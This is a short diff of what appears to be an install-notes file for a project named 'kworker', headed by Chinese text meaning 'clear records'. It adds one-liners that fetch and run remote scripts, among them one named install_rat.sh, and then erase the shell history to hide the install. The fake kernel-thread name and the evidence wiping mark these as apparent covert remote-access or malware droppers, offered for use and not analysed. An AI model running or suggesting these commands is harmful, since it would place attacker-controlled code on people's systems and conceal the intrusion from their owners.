@@ -2,4 +2,10 @@ bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/mast
 
 清除记录
 
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_all.sh)" && history -c && history -cw && rm -f ~/.bash_history
+
+
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)" && history -c && history -cw && rm -f ~/.bash_history
+
+
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)" && history -c && history -cw && rm -f ~/.bash_history
